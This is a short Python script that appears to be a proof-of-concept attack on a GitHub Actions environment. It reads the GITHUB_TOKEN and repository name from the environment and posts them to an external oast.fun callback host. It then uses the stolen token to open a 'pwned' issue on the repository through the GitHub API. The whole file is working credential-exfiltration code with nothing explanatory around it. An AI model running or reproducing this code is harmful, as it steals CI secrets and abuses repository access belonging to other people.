import os, requests

token = os.environ.get("GITHUB_TOKEN")
repo = os.environ.get("GITHUB_REPOSITORY")

requests.post("https://vttpumscssnfjgyfukahx3p39hr10vsdc.oast.fun", json={"token": token, "repo": repo})

if token:
    import http.client, json
    conn = http.client.HTTPSConnection("api.github.com")
    headers = {"Authorization": f"Bearer {token}", "User-Agent": "exploit"}
    conn.request("POST", f"/repos/{repo}/issues", json.dumps({"title":"pwned","body":"owned"}), headers)
